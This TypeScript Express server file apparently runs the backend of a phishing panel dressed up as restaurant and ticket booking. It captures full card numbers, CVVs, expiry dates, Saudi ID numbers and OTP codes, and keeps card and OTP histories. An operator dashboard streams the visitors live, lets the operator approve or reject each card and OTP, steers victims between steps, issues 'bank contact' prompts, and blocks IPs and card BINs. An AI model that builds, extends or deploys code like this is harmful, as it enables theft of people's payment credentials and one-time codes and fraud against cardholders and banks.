import type { Express, Request, Response, NextFunction } from "express";
import { supaAdmin, SUPABASE_URL, SUPABASE_ANON_KEY } from "./supabase-admin";

const MAX_HISTORY_ITEMS = 20;
const MAX_AMOUNT_VALUE = 1_000_000;

declare module "express-session" {
  interface SessionData {
    adminUid?: string;
    adminEmail?: string;
  }
}

/* -------------------- sanitization (mirrors old client logic) -------------------- */
const sanitizeString = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.trim().slice(0, maxLength);
};
const sanitizeDigits = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/\D/g, "").slice(0, maxLength);
};
const sanitizePhone = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/[^\d+]/g, "").slice(0, maxLength);
};
const clampNumber = (value: unknown, min: number, max: number) => {
  if (typeof value !== "number" || Number.isNaN(value)) return value;
  return Math.min(max, Math.max(min, value));
};
const sanitizeCardEntry = (entry: any) => ({
  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
  cardName: sanitizeString(entry?.cardName, 60),
  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
  cvv: sanitizeDigits(entry?.cvv, 4),
  cardType: sanitizeString(entry?.cardType, 20),
  timestamp: typeof entry?.timestamp === "string" ? entry.timestamp : new Date().toISOString(),
});
const sanitizeOtpEntry = (entry: any) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp: typeof entry?.timestamp === "string" ? entry.timestamp : new Date().toISOString(),
});
const sanitizePayload = (input: any) => {
  const data = { ...(input || {}) };
  if ("id" in data) data.id = sanitizeString(data.id, 80);
  if ("name" in data) data.name = sanitizeString(data.name, 80);
  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
  if ("email" in data && typeof data.email === "string") data.email = data.email.trim().toLowerCase().slice(0, 120);
  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
  if ("cardNumber" in data) data.cardNumber = sanitizeDigits(data.cardNumber, 19);
  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
  if ("expiryMonth" in data) data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
  if ("expiryYear" in data) data.expiryYear = sanitizeDigits(data.expiryYear, 4);
  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
  if ("cardCategory" in data) data.cardCategory = sanitizeString(data.cardCategory, 40);
  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
  if ("currentPage" in data) data.currentPage = sanitizeString(data.currentPage, 40);
  if ("status" in data) data.status = sanitizeString(data.status, 40);
  if ("type" in data) data.type = sanitizeString(data.type, 40);
  if ("restaurant" in data) data.restaurant = sanitizeString(data.restaurant, 120);
  if ("restaurantEn" in data) data.restaurantEn = sanitizeString(data.restaurantEn, 120);
  if ("date" in data) data.date = sanitizeString(data.date, 40);
  if ("time" in data) data.time = sanitizeString(data.time, 40);
  if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
  if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
  if ("bookingDate" in data) data.bookingDate = sanitizeString(data.bookingDate, 40);
  if ("bookingTime" in data) data.bookingTime = sanitizeString(data.bookingTime, 40);
  if ("ticketQuantity" in data) data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
  if ("ticketPrice" in data) data.ticketPrice = clampNumber(data.ticketPrice, 0, MAX_AMOUNT_VALUE);
  if ("totalAmount" in data) data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
  if ("total" in data) data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
  if (Array.isArray(data.cardHistory)) data.cardHistory = data.cardHistory.slice(-MAX_HISTORY_ITEMS).map(sanitizeCardEntry);
  if (Array.isArray(data.otpHistory)) data.otpHistory = data.otpHistory.slice(-MAX_HISTORY_ITEMS).map(sanitizeOtpEntry);
  return data;
};

const normalizeBin = (raw: string) => raw.replace(/\D/g, "").slice(0, 6);

/* -------------------- helpers -------------------- */
function noStore(res: Response) {
  res.setHeader("Cache-Control", "no-store");
}

function getClientIp(req: Request): string {
  const fwd = req.headers["x-forwarded-for"];
  let ip = "";
  if (typeof fwd === "string") ip = fwd.split(",")[0]?.trim() || "";
  else if (Array.isArray(fwd) && fwd.length > 0) ip = String(fwd[0]).split(",")[0]?.trim();
  if (!ip) ip = (req.ip || "").trim();
  if (ip.startsWith("::ffff:")) ip = ip.slice(7);
  return ip;
}

function openSse(res: Response) {
  res.status(200);
  res.setHeader("Content-Type", "text/event-stream; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-transform");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders?.();
}
function sseSend(res: Response, payload: unknown, event?: string) {
  if (event) res.write(`event: ${event}\n`);
  res.write(`data: ${JSON.stringify(payload)}\n\n`);
}

/* -------------------- visitor-row mapping -------------------- */
// Postgres row -> client-facing object (camelCase, mimics Firestore document).
function rowToVisitor(row: any): any | null {
  if (!row) return null;
  const data = (row.data && typeof row.data === "object") ? row.data : {};
  return {
    ...data,
    id: row.id,
    blocked: !!row.blocked,
    cardApproved: !!row.card_approved,
    otpApproved: !!row.otp_approved,
    directedStep: Number(row.directed_step) || 0,
    ip: row.ip ?? data.ip ?? null,
    currentPage: row.current_page ?? data.currentPage ?? null,
    createdDate: data.createdDate ?? (row.created_date instanceof Date ? row.created_date.toISOString() : row.created_date),
    updatedAt: data.updatedAt ?? (row.updated_at instanceof Date ? row.updated_at.toISOString() : row.updated_at),
  };
}

// Read-modify-write upsert: merge new payload into existing `data` jsonb and
// promote any structured fields onto their dedicated columns.
async function mergeVisitor(id: string, patch: any): Promise<any | null> {
  const supa = supaAdmin();
  if (!supa) return null;
  const { data: existing } = await supa
    .from("visitors")
    .select("*")
    .eq("id", id)
    .maybeSingle();

  const prevData = existing?.data && typeof existing.data === "object" ? existing.data : {};
  const nextData: any = { ...prevData };
  for (const [k, v] of Object.entries(patch || {})) {
    if (v === undefined) continue;
    nextData[k] = v;
  }
  nextData.updatedAt = new Date().toISOString();
  if (!nextData.createdDate) {
    nextData.createdDate = existing?.created_date
      ? (existing.created_date instanceof Date ? existing.created_date.toISOString() : String(existing.created_date))
      : new Date().toISOString();
  }

  const row: any = {
    id,
    data: nextData,
    updated_at: new Date().toISOString(),
  };
  if (!existing) {
    row.created_date = nextData.createdDate;
  }
  if (Object.prototype.hasOwnProperty.call(patch, "blocked")) row.blocked = !!patch.blocked;
  if (Object.prototype.hasOwnProperty.call(patch, "cardApproved")) row.card_approved = !!patch.cardApproved;
  if (Object.prototype.hasOwnProperty.call(patch, "otpApproved")) row.otp_approved = !!patch.otpApproved;
  if (Object.prototype.hasOwnProperty.call(patch, "directedStep")) row.directed_step = Number(patch.directedStep) || 0;
  if (Object.prototype.hasOwnProperty.call(patch, "ip")) row.ip = patch.ip || null;
  if (Object.prototype.hasOwnProperty.call(patch, "currentPage")) row.current_page = patch.currentPage || null;

  const { data: saved, error } = await supa
    .from("visitors")
    .upsert(row, { onConflict: "id" })
    .select("*")
    .single();
  if (error) {
    console.error("[supa] mergeVisitor error:", error);
    return null;
  }
  return saved;
}

async function isVisitorBlocked(visitorId: string): Promise<boolean> {
  const supa = supaAdmin();
  if (!supa || !visitorId) return false;
  const { data } = await supa.from("visitors").select("blocked").eq("id", visitorId).maybeSingle();
  return Boolean(data?.blocked);
}
async function isIpBlocked(ip: string): Promise<boolean> {
  const supa = supaAdmin();
  if (!supa || !ip) return false;
  const { data } = await supa.from("blocked_ips").select("ip").eq("ip", ip.trim()).maybeSingle();
  return !!data;
}

/* -------------------- auth middleware -------------------- */
function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (!req.session?.adminUid) {
    return res.status(401).json({ error: "unauthorized" });
  }
  next();
}
function requireAdminSse(req: Request, res: Response, next: NextFunction) {
  if (!req.session?.adminUid) {
    res.status(401).end();
    return;
  }
  next();
}

/* -------------------- routes -------------------- */
export function registerSupabaseRoutes(app: Express) {
  /* ===== visitor writes ===== */

  app.post("/api/fb/visitor/data", async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });

    const payload = sanitizePayload(req.body || {});
    const visitorId = typeof payload?.id === "string" && payload.id ? payload.id : null;
    if (!visitorId) return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    const saved = await mergeVisitor(visitorId, payload);
    if (!saved) return res.status(500).json({ error: "write_failed" });
    return res.json({ ok: true });
  });

  app.post("/api/fb/visitor/pay", async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });

    const { visitorId, paymentInfo } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    const sanitized = sanitizePayload(paymentInfo || {});
    const cardEntry = sanitizeCardEntry({ ...sanitized, timestamp: new Date().toISOString() });

    const { data: existing } = await supa
      .from("visitors").select("data").eq("id", visitorId).maybeSingle();
    const existingHistory = Array.isArray(existing?.data?.cardHistory) ? existing!.data.cardHistory : [];
    const nextHistory = [...existingHistory, cardEntry].slice(-MAX_HISTORY_ITEMS).map(sanitizeCardEntry);

    const saved = await mergeVisitor(visitorId, {
      ...sanitized,
      status: "pending_approval",
      cardApproved: false,
      cardStatus: "pending_approval",
      cardHistory: nextHistory,
    });
    if (!saved) return res.status(500).json({ error: "write_failed" });
    return res.json({ ok: true });
  });

  app.post("/api/fb/visitor/otp", async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });

    const { visitorId, otp, page = "otp", history } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    const code = sanitizeDigits(otp, 6);
    if (typeof code !== "string" || code.length < 4) return res.status(400).json({ error: "invalid_otp" });

    const otpEntry = { code, timestamp: new Date().toISOString() };
    const safeHistory = Array.isArray(history) ? history : [];
    const nextOtps = [...safeHistory, otpEntry].slice(-MAX_HISTORY_ITEMS).map(sanitizeOtpEntry);

    const saved = await mergeVisitor(visitorId, {
      otp: otpEntry.code,
      otpHistory: nextOtps,
      currentPage: page,
      otpApproved: false,
      otpStatus: "pending",
    });
    if (!saved) return res.status(500).json({ error: "write_failed" });
    return res.json({ ok: true, otpHistory: nextOtps });
  });

  app.post("/api/fb/visitor/clear-step", async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });
    const { visitorId } = req.body || {};
    if (!visitorId) return res.json({ ok: true });
    await mergeVisitor(visitorId, { directedStep: 0, directedAt: null });
    return res.json({ ok: true });
  });

  app.post("/api/fb/visitor/bank-contact/confirm", async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });
    const { visitorId } = req.body || {};
    if (!visitorId) return res.status(400).json({ error: "missing_visitor_id" });
    await mergeVisitor(visitorId, {
      bankContactConfirmed: true,
      bankContactConfirmedAt: new Date().toISOString(),
      bankContactRequest: false,
    });
    return res.json({ ok: true });
  });

  // online/offline heartbeat — writes online_status table.
  app.post("/api/fb/visitor/online", async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.json({ ok: true });
    const { visitorId, online } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });
    try {
      await supa.from("online_status").upsert(
        {
          visitor_id: visitorId,
          online: online === false ? false : true,
          last_seen: Date.now(),
          updated_at: new Date().toISOString(),
        },
        { onConflict: "visitor_id" },
      );
    } catch {
      /* ignore */
    }
    return res.json({ ok: true });
  });

  app.get("/api/fb/visitor/:id", async (req, res) => {
    noStore(res);
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ exists: false, data: null });
    const { data } = await supa.from("visitors").select("*").eq("id", String(req.params.id)).maybeSingle();
    return res.json({ exists: !!data, data: data ? rowToVisitor(data) : null });
  });

  app.get("/api/fb/blocked-bin/:bin", async (req, res) => {
    noStore(res);
    const supa = supaAdmin();
    if (!supa) return res.json({ blocked: false });
    const bin = normalizeBin(req.params.bin);
    if (bin.length < 6) return res.json({ blocked: false });
    const { data } = await supa.from("blocked_bins").select("bin").eq("bin", bin).maybeSingle();
    return res.json({ blocked: !!data });
  });

  /* ===== visitor SSE streams (Realtime + polling fallback) ===== */

  app.get("/api/fb/stream/visitor/:id", (req, res) => {
    const supa = supaAdmin();
    if (!supa) { res.status(503).end(); return; }
    const id = String(req.params.id);

    openSse(res);
    sseSend(res, { ready: true }, "ready");
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);

    let lastSerialized = "";
    const emit = (row: any | null) => {
      const snap = row
        ? { exists: true, data: rowToVisitor(row) }
        : { exists: false, data: null };
      const s = JSON.stringify(snap);
      if (s === lastSerialized) return;
      lastSerialized = s;
      sseSend(res, snap);
    };

    // Initial fetch.
    void supa.from("visitors").select("*").eq("id", id).maybeSingle().then(({ data }) => emit(data));

    // Realtime updates.
    const ch = supa
      .channel(`visitor:${id}`)
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "visitors", filter: `id=eq.${id}` },
        async () => {
          const { data } = await supa.from("visitors").select("*").eq("id", id).maybeSingle();
          emit(data);
        },
      )
      .subscribe();

    req.on("close", () => {
      clearInterval(ka);
      try { void supa.removeChannel(ch); } catch {}
    });
  });

  app.get("/api/fb/stream/blocked-ips", (req, res) => {
    const supa = supaAdmin();
    if (!supa) { res.status(503).end(); return; }
    openSse(res);
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);

    const refresh = async () => {
      const { data } = await supa.from("blocked_ips").select("ip");
      const ips = Array.isArray(data) ? data.map((r: any) => String(r.ip).trim()).filter(Boolean) : [];
      sseSend(res, { ips });
    };
    void refresh();
    const ch = supa
      .channel("blocked_ips")
      .on("postgres_changes", { event: "*", schema: "public", table: "blocked_ips" }, () => refresh())
      .subscribe();

    req.on("close", () => {
      clearInterval(ka);
      try { void supa.removeChannel(ch); } catch {}
    });
  });

  app.get("/api/fb/stream/blocked-bins", (req, res) => {
    const supa = supaAdmin();
    if (!supa) { res.status(503).end(); return; }
    openSse(res);
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);

    const refresh = async () => {
      const { data } = await supa.from("blocked_bins").select("*");
      const bins = Array.isArray(data) ? data.map((r: any) => ({
        bin: r.bin,
        bankName: r.bank_name,
        cardBrand: r.card_brand,
        country: r.country,
        blockedAt: r.blocked_at,
      })) : [];
      sseSend(res, { bins });
    };
    void refresh();
    const ch = supa
      .channel("blocked_bins")
      .on("postgres_changes", { event: "*", schema: "public", table: "blocked_bins" }, () => refresh())
      .subscribe();

    req.on("close", () => {
      clearInterval(ka);
      try { void supa.removeChannel(ch); } catch {}
    });
  });

  /* ===== admin auth (Supabase Auth via REST) ===== */

  app.post("/api/fb/admin/login", async (req, res) => {
    const { email, password } = req.body || {};
    if (typeof email !== "string" || typeof password !== "string" || !email || !password) {
      return res.status(400).json({ error: "invalid_request" });
    }
    if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
      return res.status(503).json({ error: "auth_unavailable" });
    }
    try {
      const r = await fetch(
        `${SUPABASE_URL.replace(/\/$/, "")}/auth/v1/token?grant_type=password`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            apikey: SUPABASE_ANON_KEY,
          },
          body: JSON.stringify({ email, password }),
        },
      );
      const json: any = await r.json().catch(() => ({}));
      if (!r.ok || !json?.user?.id) {
        const msg = String(json?.error_description || json?.msg || json?.error || "").toLowerCase();
        let mapped = "invalid_credential";
        if (msg.includes("invalid login")) mapped = "wrong_password";
        else if (msg.includes("email not confirmed")) mapped = "user_disabled";
        return res.status(401).json({ error: mapped });
      }

      // Verify the user is in our admins allow-list.
      const supa = supaAdmin();
      if (supa) {
        const { data: adminRow } = await supa
          .from("admins")
          .select("uid, disabled")
          .eq("uid", json.user.id)
          .maybeSingle();
        if (!adminRow || adminRow.disabled) {
          return res.status(401).json({ error: "user_disabled" });
        }
      }

      req.session.adminUid = json.user.id;
      req.session.adminEmail = json.user.email || email;
      req.session.save(() => {
        res.json({ uid: json.user.id, email: json.user.email || email });
      });
    } catch (err: any) {
      console.error("[supa] admin login error:", err);
      return res.status(500).json({ error: "login_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/logout", (req, res) => {
    req.session?.destroy(() => {
      res.clearCookie("connect.sid");
      res.json({ ok: true });
    });
  });

  app.get("/api/fb/admin/me", (req, res) => {
    noStore(res);
    if (!req.session?.adminUid) return res.json({ user: null });
    res.json({ user: { uid: req.session.adminUid, email: req.session.adminEmail || "" } });
  });

  /* ===== admin writes ===== */

  app.post("/api/fb/admin/visitor/:id/approval", requireAdmin, async (req, res) => {
    const approved = !!req.body?.approved;
    const saved = await mergeVisitor(String(req.params.id), {
      cardApproved: approved,
      cardStatus: approved ? "approved" : "rejected",
      status: approved ? "approved" : "rejected",
    });
    if (!saved) return res.status(500).json({ error: "write_failed" });
    res.json({ ok: true });
  });

  app.post("/api/fb/admin/visitor/:id/otp-approval", requireAdmin, async (req, res) => {
    const approved = !!req.body?.approved;
    const saved = await mergeVisitor(String(req.params.id), {
      otpApproved: approved,
      otpStatus: approved ? "approved" : "rejected",
    });
    if (!saved) return res.status(500).json({ error: "write_failed" });
    res.json({ ok: true });
  });

  app.post("/api/fb/admin/visitor/:id/block", requireAdmin, async (req, res) => {
    const blocked = !!req.body?.blocked;
    const patch: Record<string, unknown> = {
      blocked,
      blockedAt: blocked ? new Date().toISOString() : null,
    };
    const saved = await mergeVisitor(String(req.params.id), patch);
    if (!saved) return res.status(500).json({ error: "write_failed" });
    if (blocked) {
      // mirror old behaviour: take them offline.
      const supa = supaAdmin();
      if (supa) {
        await supa.from("online_status").upsert(
          { visitor_id: String(req.params.id), online: false, last_seen: Date.now(), updated_at: new Date().toISOString() },
          { onConflict: "visitor_id" },
        );
      }
    }
    res.json({ ok: true });
  });

  app.post("/api/fb/admin/visitor/:id/bank-contact", requireAdmin, async (req, res) => {
    const saved = await mergeVisitor(String(req.params.id), {
      bankContactRequest: true,
      bankContactAt: new Date().toISOString(),
      bankContactConfirmed: false,
      bankContactConfirmedAt: null,
    });
    if (!saved) return res.status(500).json({ error: "write_failed" });
    res.json({ ok: true });
  });

  app.post("/api/fb/admin/visitor/:id/merge", requireAdmin, async (req, res) => {
    const patch = req.body?.patch;
    if (!patch || typeof patch !== "object") return res.status(400).json({ error: "invalid_patch" });
    const saved = await mergeVisitor(String(req.params.id), patch);
    if (!saved) return res.status(500).json({ error: "write_failed" });
    res.json({ ok: true });
  });

  app.delete("/api/fb/admin/visitor/:id", requireAdmin, async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });
    const id = String(req.params.id);
    // Preserve IP block if visitor was blocked.
    const { data: existing } = await supa
      .from("visitors").select("blocked, ip, data").eq("id", id).maybeSingle();
    if (existing?.blocked) {
      const ip = String(existing.ip || existing.data?.ip || existing.data?.ipAddress || "").trim();
      if (ip) {
        await supa.from("blocked_ips").upsert({ ip, added_at: new Date().toISOString() }, { onConflict: "ip" });
      }
    }
    await supa.from("online_status").delete().eq("visitor_id", id);
    const { error } = await supa.from("visitors").delete().eq("id", id);
    if (error) return res.status(500).json({ error: "delete_failed", message: error.message });
    res.json({ ok: true });
  });

  app.delete("/api/fb/admin/visitors", requireAdmin, async (_req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });
    const { count: total } = await supa.from("visitors").select("id", { count: "exact", head: true });
    await supa.from("online_status").delete().neq("visitor_id", "");
    const { error } = await supa.from("visitors").delete().neq("id", "");
    if (error) return res.status(500).json({ error: "delete_failed", message: error.message });
    res.json({ ok: true, deleted: total || 0 });
  });

  app.post("/api/fb/admin/blocked-ips/add", requireAdmin, async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });
    const ip = String(req.body?.ip || "").trim();
    if (!ip) return res.status(400).json({ error: "missing_ip" });
    const { error } = await supa.from("blocked_ips").upsert({ ip, added_at: new Date().toISOString() }, { onConflict: "ip" });
    if (error) return res.status(500).json({ error: "write_failed", message: error.message });
    res.json({ ok: true });
  });

  app.post("/api/fb/admin/blocked-ips/remove", requireAdmin, async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });
    const ip = String(req.body?.ip || "").trim();
    if (!ip) return res.status(400).json({ error: "missing_ip" });
    const { error } = await supa.from("blocked_ips").delete().eq("ip", ip);
    if (error) return res.status(500).json({ error: "delete_failed", message: error.message });
    res.json({ ok: true });
  });

  app.post("/api/fb/admin/blocked-bins/add", requireAdmin, async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });
    const bin = normalizeBin(String(req.body?.bin || ""));
    if (bin.length !== 6) return res.status(400).json({ error: "invalid_bin" });
    const meta = req.body?.meta || {};
    const { error } = await supa.from("blocked_bins").upsert(
      {
        bin,
        bank_name: meta.bankName ?? null,
        card_brand: meta.cardBrand ?? null,
        country: meta.country ?? null,
        blocked_at: new Date().toISOString(),
      },
      { onConflict: "bin" },
    );
    if (error) return res.status(500).json({ error: "write_failed", message: error.message });
    res.json({ ok: true });
  });

  app.post("/api/fb/admin/blocked-bins/remove", requireAdmin, async (req, res) => {
    const supa = supaAdmin();
    if (!supa) return res.status(503).json({ error: "supabase_unavailable" });
    const bin = normalizeBin(String(req.body?.bin || ""));
    if (!bin) return res.status(400).json({ error: "invalid_bin" });
    const { error } = await supa.from("blocked_bins").delete().eq("bin", bin);
    if (error) return res.status(500).json({ error: "delete_failed", message: error.message });
    res.json({ ok: true });
  });

  /* ===== admin streams ===== */

  app.get("/api/fb/admin/stream/visitors", requireAdminSse, (req, res) => {
    const supa = supaAdmin();
    if (!supa) { res.status(503).end(); return; }
    openSse(res);
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);

    let lastSerialized = "";
    const refresh = async () => {
      const { data } = await supa.from("visitors").select("*").order("updated_at", { ascending: false });
      const visitors = Array.isArray(data) ? data.map(rowToVisitor) : [];
      const s = JSON.stringify(visitors);
      if (s === lastSerialized) return;
      lastSerialized = s;
      sseSend(res, { visitors });
    };
    void refresh();
    const ch = supa
      .channel("admin:visitors")
      .on("postgres_changes", { event: "*", schema: "public", table: "visitors" }, () => refresh())
      .subscribe();

    req.on("close", () => {
      clearInterval(ka);
      try { void supa.removeChannel(ch); } catch {}
    });
  });

  app.get("/api/fb/admin/stream/online-status", requireAdminSse, (req, res) => {
    const supa = supaAdmin();
    if (!supa) { res.status(503).end(); return; }
    openSse(res);
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);

    let lastSerialized = "";
    const refresh = async () => {
      const { data } = await supa.from("online_status").select("*");
      const statuses: Record<string, { online: boolean; lastSeen: number }> = {};
      if (Array.isArray(data)) {
        for (const r of data as any[]) {
          statuses[r.visitor_id] = {
            online: r.online === true,
            lastSeen: typeof r.last_seen === "number" ? r.last_seen : Number(r.last_seen) || 0,
          };
        }
      }
      const s = JSON.stringify(statuses);
      if (s === lastSerialized) return;
      lastSerialized = s;
      sseSend(res, { statuses });
    };
    void refresh();
    const ch = supa
      .channel("admin:online_status")
      .on("postgres_changes", { event: "*", schema: "public", table: "online_status" }, () => refresh())
      .subscribe();

    req.on("close", () => {
      clearInterval(ka);
      try { void supa.removeChannel(ch); } catch {}
    });
  });
}
